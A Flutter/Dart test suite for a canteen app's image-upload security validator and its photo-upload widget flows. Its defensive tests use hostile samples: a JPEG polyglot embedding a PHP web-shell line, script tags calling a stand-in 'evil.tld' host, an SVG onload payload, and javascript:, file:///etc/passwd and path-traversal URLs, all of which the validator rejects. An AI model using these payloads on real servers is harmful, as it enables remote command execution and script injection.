import 'dart:convert';
import 'dart:typed_data';

import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:kantin_cerdas/core/errors/api_exception.dart';
import 'package:kantin_cerdas/core/errors/data_parsing_exception.dart';
import 'package:kantin_cerdas/core/media/image_picker_port.dart';
import 'package:kantin_cerdas/core/media/image_security_validator.dart';
import 'package:kantin_cerdas/core/media/media_upload_category.dart';
import 'package:kantin_cerdas/core/media/media_upload_failure.dart';
import 'package:kantin_cerdas/core/media/media_upload_repository.dart';
import 'package:kantin_cerdas/core/session/user_role.dart';
import 'package:kantin_cerdas/core/widgets/kc_entity_image.dart';
import 'package:kantin_cerdas/features/auth/data/models/user_model.dart';
import 'package:kantin_cerdas/features/auth/domain/entities/user.dart';
import 'package:kantin_cerdas/features/auth/presentation/providers/auth_state_provider.dart';
import 'package:kantin_cerdas/features/auth/presentation/widgets/profile_identity_header.dart';
import 'package:kantin_cerdas/features/customer/data/mappers/customer_catalog_failure_mapper.dart';
import 'package:kantin_cerdas/features/customer/domain/failures/customer_catalog_failure.dart';
import 'package:kantin_cerdas/features/customer/presentation/pages/customer_profile_page.dart';
import 'package:kantin_cerdas/features/owner/domain/entities/owner_menu.dart';
import 'package:kantin_cerdas/features/owner/domain/entities/owner_stall.dart';
import 'package:kantin_cerdas/features/owner/presentation/controllers/owner_mutation_controller.dart';
import 'package:kantin_cerdas/features/owner/presentation/pages/owner_stall_settings_page.dart';
import 'package:kantin_cerdas/features/owner/presentation/widgets/menu/owner_menu_editor.dart';

import '../../support/simulation/simulation.dart';
import '../../support/simulation/simulation_overrides.dart';

class _ConfigurablePickerPort implements ImagePickerPort {
  _ConfigurablePickerPort(this.bytesToReturn);

  Uint8List? bytesToReturn;
  ImagePickSource? lastSource;

  @override
  Future<RawPickedImage?> pickImage(ImagePickSource source) async {
    lastSource = source;
    final bytes = bytesToReturn;
    return bytes == null ? null : RawPickedImage(bytes: bytes);
  }
}

class _RecordingUploadRepository implements MediaUploadRepository {
  final List<ValidatedUploadImage> uploadedImages = <ValidatedUploadImage>[];

  @override
  bool get isConfigured => true;

  @override
  Future<String> uploadImage(ValidatedUploadImage image) async {
    uploadedImages.add(image);
    return 'https://cdn.kantincerdas.ac.id/uploads/${image.category.slug}/${image.safeFileName}';
  }
}

Uint8List _validJpegBytes() {
  return Uint8List.fromList(<int>[
    0xFF,
    0xD8,
    0xFF,
    0xE0,
    0x00,
    0x10,
    0x4A,
    0x46,
    0x49,
    0x46,
    0x00,
    0x01,
    0x01,
    0x01,
    0x00,
    0x48,
    0x00,
    0x48,
    0x00,
    0x00,
    0xFF,
    0xDB,
    0x00,
    0x43,
    0x00,
    0x08,
    0x06,
    0x06,
    0x07,
    0x06,
    0x05,
    0x08,
    0x07,
    0x07,
    0xFF,
    0xD9,
  ]);
}

Uint8List _validWebpBytes() {
  return Uint8List.fromList(<int>[
    0x52, 0x49, 0x46, 0x46, // RIFF
    0x1C, 0x00, 0x00, 0x00, // size
    0x57, 0x45, 0x42, 0x50, // WEBP
    0x56, 0x50, 0x38, 0x20, // 'VP8 '
    0x10, 0x00, 0x00, 0x00,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
    0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
  ]);
}

void main() {
  group('ImageSecurityValidator Zero-Trust Security Audit', () {
    test(
      'menghasilkan nama file acak kanonis {userId}_{category}_{uuidV4}.{ext} dan mengabaikan karakter berbahaya pada actorId',
      () {
        final validated1 = ImageSecurityValidator.validateAndPrepare(
          bytes: SimulationImagePickerPort.validSamplePngBytes,
          actorId: '  ../../User_01<script>!@#  ',
          category: MediaUploadCategory.profileAvatar,
        );
        final validated2 = ImageSecurityValidator.validateAndPrepare(
          bytes: _validJpegBytes(),
          actorId: 'usr-99',
          category: MediaUploadCategory.menuPhoto,
        );
        final validated3 = ImageSecurityValidator.validateAndPrepare(
          bytes: _validWebpBytes(),
          actorId: 'owner_42',
          category: MediaUploadCategory.stallPhoto,
        );

        expect(
          ImageSecurityValidator.isSafeGeneratedFileName(
            validated1.safeFileName,
          ),
          isTrue,
        );
        expect(
          validated1.safeFileName,
          startsWith('user_01script_profile_avatar_'),
        );
        expect(validated1.safeFileName, endsWith('.png'));
        expect(validated1.mimeType, 'image/png');

        expect(
          ImageSecurityValidator.isSafeGeneratedFileName(
            validated2.safeFileName,
          ),
          isTrue,
        );
        expect(validated2.safeFileName, startsWith('usr-99_menu_photo_'));
        expect(validated2.safeFileName, endsWith('.jpg'));
        expect(validated2.mimeType, 'image/jpeg');

        expect(
          ImageSecurityValidator.isSafeGeneratedFileName(
            validated3.safeFileName,
          ),
          isTrue,
        );
        expect(validated3.safeFileName, startsWith('owner_42_stall_photo_'));
        expect(validated3.safeFileName, endsWith('.webp'));
        expect(validated3.mimeType, 'image/webp');

        // Pastikan UUID selalu acak dan tidak pernah bentrok
        final validated2Again = ImageSecurityValidator.validateAndPrepare(
          bytes: _validJpegBytes(),
          actorId: 'usr-99',
          category: MediaUploadCategory.menuPhoto,
        );
        expect(
          validated2.safeFileName,
          isNot(equals(validated2Again.safeFileName)),
        );
      },
    );

    test(
      'menolak file kosong, terlalu besar (> 2 MB), atau berformat skrip/SVG/HTML/PHP meskipun diklaim sebagai gambar',
      () {
        expect(
          () => ImageSecurityValidator.validateAndPrepare(
            bytes: Uint8List(0),
            actorId: 'usr-1',
            category: MediaUploadCategory.profileAvatar,
          ),
          throwsA(
            isA<MediaInvalidImageFailure>().having(
              (e) => e.reason,
              'reason',
              MediaValidationReason.emptyFile,
            ),
          ),
        );

        final oversized = Uint8List(ImageSecurityValidator.maxImageBytes + 1);
        expect(
          () => ImageSecurityValidator.validateAndPrepare(
            bytes: oversized,
            actorId: 'usr-1',
            category: MediaUploadCategory.profileAvatar,
          ),
          throwsA(
            isA<MediaInvalidImageFailure>().having(
              (e) => e.reason,
              'reason',
              MediaValidationReason.fileTooLarge,
            ),
          ),
        );

        final svgPayload = Uint8List.fromList(
          utf8.encode(
            '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>',
          ),
        );
        expect(
          () => ImageSecurityValidator.validateAndPrepare(
            bytes: svgPayload,
            actorId: 'usr-1',
            category: MediaUploadCategory.profileAvatar,
          ),
          throwsA(
            isA<MediaInvalidImageFailure>().having(
              (e) => e.reason,
              'reason',
              MediaValidationReason.unsupportedFormat,
            ),
          ),
        );
      },
    );

    test(
      'menolak serangan polyglot (header JPEG/PNG asli yang disisipi payload <script> atau <?php)',
      () {
        final polyglotJpeg = Uint8List.fromList(<int>[
          0xFF,
          0xD8,
          0xFF,
          0xFE,
          0x00,
          0x24,
          ...utf8.encode('<?php system(\$_GET["cmd"]); ?>'),
          0xFF,
          0xD9,
        ]);

        expect(
          () => ImageSecurityValidator.validateAndPrepare(
            bytes: polyglotJpeg,
            actorId: 'usr-1',
            category: MediaUploadCategory.profileAvatar,
          ),
          throwsA(
            isA<MediaInvalidImageFailure>().having(
              (e) => e.reason,
              'reason',
              MediaValidationReason.suspiciousScriptPayload,
            ),
          ),
        );

        final polyglotXss = Uint8List.fromList(<int>[
          0xFF,
          0xD8,
          0xFF,
          0xE0,
          ...utf8.encode('<ScRiPt>fetch("https://evil.tld")</sCrIpT>'),
          0xFF,
          0xD9,
        ]);

        expect(
          () => ImageSecurityValidator.validateAndPrepare(
            bytes: polyglotXss,
            actorId: 'usr-1',
            category: MediaUploadCategory.menuPhoto,
          ),
          throwsA(
            isA<MediaInvalidImageFailure>().having(
              (e) => e.reason,
              'reason',
              MediaValidationReason.suspiciousScriptPayload,
            ),
          ),
        );
      },
    );

    test(
      'memvalidasi URL gambar secara ketat dan menolak skema berbahaya atau path traversal',
      () {
        expect(
          ImageSecurityValidator.normalizeSafeImageUrl(
            'https://cdn.kantincerdas.ac.id/media/profile_avatar/usr_1.jpg',
          ),
          'https://cdn.kantincerdas.ac.id/media/profile_avatar/usr_1.jpg',
        );
        expect(ImageSecurityValidator.normalizeSafeImageUrl(null), isNull);
        expect(ImageSecurityValidator.normalizeSafeImageUrl('   '), isNull);

        for (final unsafeUrl in const <String>[
          'javascript:alert(1)',
          'data:image/svg+xml;base64,PHN2Zz4=',
          'file:///etc/passwd',
          'https://admin:secret@cdn.kantincerdas.ac.id/img.jpg',
          'https://cdn.kantincerdas.ac.id/media/../../etc/passwd',
          'https://cdn.kantincerdas.ac.id/media/<script>.jpg',
        ]) {
          expect(
            () => ImageSecurityValidator.normalizeSafeImageUrl(unsafeUrl),
            throwsFormatException,
            reason: 'URL tidak aman harus ditolak: $unsafeUrl',
          );
        }

        expect(
          () => OwnerMenuInput(
            stallId: 'stall-1',
            name: 'Nasi Goreng',
            description: 'Enak',
            category: OwnerMenuCategory.rice,
            priceIdr: 15000,
            isAvailable: true,
            imageUrl: 'javascript:alert(1)',
          ),
          throwsArgumentError,
        );

        expect(
          () => OwnerStallInput(
            id: 'stall-1',
            name: 'Kantin A',
            block: 'Blok Utara',
            description: 'Bersih',
            isOpen: true,
            prepTimeMin: 10,
            expectedVersion: 1,
            imageUrl: 'https://cdn.kantincerdas.ac.id/../secret.jpg',
          ),
          throwsArgumentError,
        );

        expect(
          () => UserModel.fromJson(const <String, Object?>{
            'id': 'usr-1',
            'username': 'budi',
            'email': 'budi@kampus.ac.id',
            'name': 'Budi',
            'role': 'customer',
            'is_active': true,
            'avatar_url': 'javascript:evil()',
          }),
          throwsA(isA<DataParsingException>()),
        );
      },
    );
  });

  group('End-to-End Widget Flows: Profile Avatar, Menu Photo, & Stall Photo', () {
    testWidgets(
      'CustomerProfilePage dapat memilih foto profil (Kamera/Galeri), memvalidasi & mengunggah dengan nama acak, lalu menghapus foto profil',
      (tester) async {
        final store = SimulationStore.memory();
        await store.signIn('customer-1');
        final picker = _ConfigurablePickerPort(
          SimulationImagePickerPort.validSamplePngBytes,
        );
        final uploader = _RecordingUploadRepository();

        await tester.pumpWidget(
          ProviderScope(
            overrides: simulationOverrides(
              store,
              imagePicker: picker,
              mediaUpload: uploader,
            ),
            child: MaterialApp(
              home: Scaffold(
                body: Consumer(
                  builder: (context, ref, _) {
                    final auth = ref.watch(authStateProvider);
                    final user = auth.asData?.value;
                    if (user == null) {
                      return const SizedBox.shrink();
                    }
                    return CustomerProfilePage(user: user);
                  },
                ),
              ),
            ),
          ),
        );
        await tester.pumpAndSettle();

        // Tap avatar untuk membuka bottom sheet WhatsApp-style
        await tester.tap(
          find.byKey(const Key('profile_avatar_picker_trigger')),
        );
        await tester.pumpAndSettle();

        expect(find.text('Ambil foto (Kamera)'), findsOneWidget);
        expect(find.text('Pilih dari galeri'), findsOneWidget);
        expect(find.text('Hapus foto profil'), findsNothing);

        await tester.tap(find.byKey(const Key('kc_image_source_gallery')));
        await tester.pumpAndSettle();

        expect(picker.lastSource, ImagePickSource.gallery);
        expect(uploader.uploadedImages, hasLength(1));
        final uploaded = uploader.uploadedImages.single;
        expect(uploaded.category, MediaUploadCategory.profileAvatar);
        expect(uploaded.safeFileName, startsWith('customer-1_profile_avatar_'));
        expect(uploaded.safeFileName, endsWith('.png'));
        expect(store.sessionUser?.avatarUrl, isNotNull);

        // Sekarang buka lagi dan uji tombol Hapus foto profil
        await tester.tap(
          find.byKey(const Key('profile_avatar_picker_trigger')),
        );
        await tester.pumpAndSettle();

        expect(find.text('Hapus foto profil'), findsOneWidget);
        await tester.tap(find.byKey(const Key('kc_image_source_remove')));
        await tester.pumpAndSettle();

        expect(store.sessionUser?.avatarUrl, isNull);
      },
    );

    testWidgets(
      'OwnerMenuEditor dan OwnerStallSettingsPage dapat mengunggah foto dengan nama file acak dan menolak file berbahaya',
      (tester) async {
        final store = SimulationStore.memory();
        await store.signIn('owner-1');
        final maliciousPolyglot = Uint8List.fromList(<int>[
          0xFF,
          0xD8,
          0xFF,
          0xE0,
          ...utf8.encode('<script> evil_payload_attack() </script>'),
          0xFF,
          0xD9,
        ]);
        final picker = _ConfigurablePickerPort(maliciousPolyglot);
        final uploader = _RecordingUploadRepository();

        await tester.pumpWidget(
          ProviderScope(
            overrides: simulationOverrides(
              store,
              imagePicker: picker,
              mediaUpload: uploader,
            ),
            child: MaterialApp(
              home: Scaffold(
                body: Consumer(
                  builder: (context, ref, _) {
                    final auth = ref.watch(authStateProvider);
                    final mutation = ref.watch(ownerMutationProvider);
                    if (auth.activeOwnerId == null || mutation.blocked) {
                      return const SizedBox.shrink();
                    }
                    return const OwnerMenuEditor(stallId: 'stall-1');
                  },
                ),
              ),
            ),
          ),
        );
        await tester.pumpAndSettle();

        // 1. Coba pilih file polyglot berbahaya -> harus ditolak sebelum menyentuh uploader
        await tester.tap(find.byKey(const Key('kc_image_picker_field_button')));
        await tester.pumpAndSettle();
        await tester.tap(find.byKey(const Key('kc_image_source_camera')));
        await tester.pumpAndSettle();

        expect(uploader.uploadedImages, isEmpty);
        expect(
          find.text('Gambar ditolak karena mengandung konten yang tidak aman.'),
          findsOneWidget,
        );

        // 2. Ganti dengan gambar JPEG asli -> berhasil diunggah dengan nama acak aman
        picker.bytesToReturn = _validJpegBytes();
        await tester.tap(find.byKey(const Key('kc_image_picker_field_button')));
        await tester.pumpAndSettle();
        await tester.tap(find.byKey(const Key('kc_image_source_gallery')));
        await tester.pumpAndSettle();

        expect(uploader.uploadedImages, hasLength(1));
        expect(
          uploader.uploadedImages.single.safeFileName,
          startsWith('owner-1_menu_photo_'),
        );
        expect(uploader.uploadedImages.single.safeFileName, endsWith('.jpg'));
        expect(find.text('Foto terpilih'), findsOneWidget);

        // 3. Uji juga di halaman Pengaturan Stan (OwnerStallSettingsPage)
        await tester.pumpWidget(
          ProviderScope(
            overrides: simulationOverrides(
              store,
              imagePicker: picker,
              mediaUpload: uploader,
            ),
            child: MaterialApp(
              home: Consumer(
                builder: (context, ref, _) {
                  final auth = ref.watch(authStateProvider);
                  final mutation = ref.watch(ownerMutationProvider);
                  if (auth.activeOwnerId == null || mutation.blocked) {
                    return const SizedBox.shrink();
                  }
                  return const OwnerStallSettingsPage();
                },
              ),
            ),
          ),
        );
        await tester.pumpAndSettle();

        await tester.tap(find.byKey(const Key('kc_image_picker_field_button')));
        await tester.pumpAndSettle();
        await tester.tap(find.byKey(const Key('kc_image_source_gallery')));
        await tester.pumpAndSettle();

        expect(uploader.uploadedImages, hasLength(2));
        expect(
          uploader.uploadedImages.last.safeFileName,
          startsWith('owner-1_stall_photo_'),
        );
      },
    );

    testWidgets(
      'KcEntityImage menerapkan cacheWidth/cacheHeight berbasis DPR dan membedakan key memori untuk byte berukuran sama namun isi berbeda',
      (tester) async {
        final bytesA = Uint8List.fromList(
          SimulationImagePickerPort.validSamplePngBytes,
        );
        final bytesB = Uint8List.fromList(
          SimulationImagePickerPort.validSamplePngBytes,
        );
        // Ubah byte tengah tanpa mengubah panjang array
        bytesB[bytesB.length ~/ 2] = (bytesB[bytesB.length ~/ 2] + 1) & 0xFF;

        await tester.pumpWidget(
          MaterialApp(
            home: MediaQuery(
              data: const MediaQueryData(devicePixelRatio: 2.0),
              child: Scaffold(
                body: KcEntityImage.thumbnail(
                  imageUrl: null,
                  previewBytes: bytesA,
                  width: 80,
                  height: 60,
                  fallbackIcon: Icons.fastfood_rounded,
                ),
              ),
            ),
          ),
        );

        final firstImage = tester.widget<Image>(find.byType(Image));
        final firstKey = firstImage.key;
        expect(firstImage.image, isA<ResizeImage>());
        final resized = firstImage.image as ResizeImage;
        expect(resized.width, 160);
        expect(resized.height, 120);

        await tester.pumpWidget(
          MaterialApp(
            home: MediaQuery(
              data: const MediaQueryData(devicePixelRatio: 2.0),
              child: Scaffold(
                body: KcEntityImage.thumbnail(
                  imageUrl: null,
                  previewBytes: bytesB,
                  width: 80,
                  height: 60,
                  fallbackIcon: Icons.fastfood_rounded,
                ),
              ),
            ),
          ),
        );

        final secondImage = tester.widget<Image>(find.byType(Image));
        expect(secondImage.key, isNot(equals(firstKey)));
      },
    );

    test(
      'pemetaan HTTP 429 menghasilkan MediaRateLimitedFailure dan CustomerCatalogServerFailure secara eksplisit',
      () {
        expect(
          mediaUploadErrorMessage(const MediaRateLimitedFailure()),
          'Terlalu banyak permintaan unggah gambar. Tunggu sebentar lalu coba lagi.',
        );
        expect(
          mapCustomerCatalogApiException(
            ApiException(
              type: ApiExceptionType.response,
              statusCode: 429,
              message: 'Too Many Requests',
            ),
          ),
          isA<CustomerCatalogServerFailure>(),
        );
      },
    );

    testWidgets(
      'ProfileIdentityHeader merender nama dan username reaktif dari authStateProvider meskipun prop user awal belum diperbarui',
      (tester) async {
        final store = SimulationStore.memory();
        await store.signIn('customer-1');
        const stalePropUser = User(
          id: 'customer-1',
          username: 'username_lama',
          email: 'lama@kampus.ac.id',
          name: 'Nama Lama Prop',
          role: UserRole.customer,
          isActive: true,
        );

        await tester.pumpWidget(
          ProviderScope(
            overrides: simulationOverrides(store),
            child: const MaterialApp(
              home: Scaffold(body: ProfileIdentityHeader(user: stalePropUser)),
            ),
          ),
        );
        await tester.pumpAndSettle();

        final activeSessionUser = store.sessionUser!;
        expect(find.text(activeSessionUser.name), findsOneWidget);
        expect(find.text('@${activeSessionUser.username}'), findsOneWidget);
        expect(find.text('Nama Lama Prop'), findsNothing);
      },
    );
  });
}
